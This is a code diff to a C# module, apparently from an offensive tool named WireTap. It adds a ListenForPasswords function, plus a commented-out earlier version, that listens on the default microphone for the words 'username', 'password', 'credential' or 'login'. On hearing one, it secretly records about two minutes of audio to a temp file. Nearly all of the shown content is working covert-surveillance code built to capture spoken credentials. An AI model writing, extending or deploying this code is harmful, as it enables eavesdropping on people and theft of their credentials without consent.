@@ -5,14 +5,100 @@ using System.Threading;
 using System.Runtime.InteropServices;
 using System.Text;
 using NAudio.Wave.SampleProviders;
+//using Microsoft.Speech.Recognition;
+//using Microsoft.Speech.Synthesis;
+using System.Speech.Recognition;
 
 namespace WireTap
 {
     class Audio
     {
-        //private static WaveIn waveSource = null;
-        //private static WaveFileWriter waveFile = null;
+        static bool done = false;
+        static bool speechOn = true;
+        static bool recording = false;
 
+        // BEGIN MICROSOFT.SPEECH
+
+        //public static void SpeechToText()
+        //{
+        //    try
+        //    {
+        //        SpeechSynthesizer ss = new SpeechSynthesizer();
+        //        SpeechRecognitionEngine sre;
+
+        //        ss.SetOutputToDefaultAudioDevice();
+        //        CultureInfo ci = new CultureInfo("en-US");
+        //        sre = new SpeechRecognitionEngine(ci);
+        //        sre.SetInputToDefaultAudioDevice();
+        //        sre.SpeechHypothesized += sre_SpeechHypothesized;
+        //        Choices ch_credential = new Choices();
+        //        ch_credential.Add("username");
+        //        ch_credential.Add("password");
+        //        ch_credential.Add("credential");
+        //        ch_credential.Add("login");
+        //        GrammarBuilder gb_passwordListener = new GrammarBuilder();
+        //        gb_passwordListener.Append(ch_credential);
+        //        Grammar g_passwordListener = new Grammar(gb_passwordListener);
+        //        sre.LoadGrammarAsync(g_passwordListener);
+        //        sre.RecognizeAsync(RecognizeMode.Multiple);
+        //        Console.WriteLine("Listening now for credentials...");
+        //        while (done == false) {; }
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine(ex.Message);
+        //    }
+        //}
+
+        //private static void sre_SpeechHypothesized(object sender, SpeechHypothesizedEventArgs e)
+        //{
+        //    if (e.Result.Text != null && recording == false)
+        //    {
+        //        string fname = Helpers.CreateTempFileName(".wav");
+        //        Console.WriteLine("[!] Heard interesting phrase {0}, staring two-minute recording.", e.Result.Text);
+        //        Console.WriteLine("[!] Filename: {0}", fname);
+        //        RecordMicrophone(fname, 12000);// begin recording for two minutes.
+        //        Console.WriteLine("[!] Finished recording. File at: {0}", fname);
+        //    }
+        //}
+
+
+        // END MICROSOFT.SPEECH
+
+
+
+        public static void ListenForPasswords()
+        {
+            SpeechRecognitionEngine recognizer = new SpeechRecognitionEngine();
+            GrammarBuilder gb = new GrammarBuilder();
+            Choices ch = new Choices();
+            ch.Add("username");
+            ch.Add("password");
+            ch.Add("credential");
+            ch.Add("login");
+            gb.Append(ch);
+            Grammar dictationGrammar = new Grammar(gb);
+            recognizer.LoadGrammar(dictationGrammar);
+            recognizer.SetInputToDefaultAudioDevice();
+            while (true)
+            {
+                RecognitionResult result = recognizer.Recognize();
+                if (result != null && !recording)
+                {
+                    string fname = Helpers.CreateTempFileName(".wav");
+                    Console.WriteLine("[!] Heard interesting phrase {0}, staring two-minute recording.", result.Text);
+                    Console.WriteLine("[!] Filename: {0}", fname);
+                    RecordMicrophone(fname, 12000);// begin recording for two minutes.
+                    Console.WriteLine("[!] Finished recording. File at: {0}", fname);
+                }
+                else if (recording)
+                {
+                    Thread.Sleep(5000);
+                }
+            }
+            recognizer.UnloadAllGrammars();
+        }
+        
         public static void RecordSystemAudio(string outFile, int msToRecord = 10000)
         {
             // Redefine the capturer instance with a new instance of the LoopbackCapture class
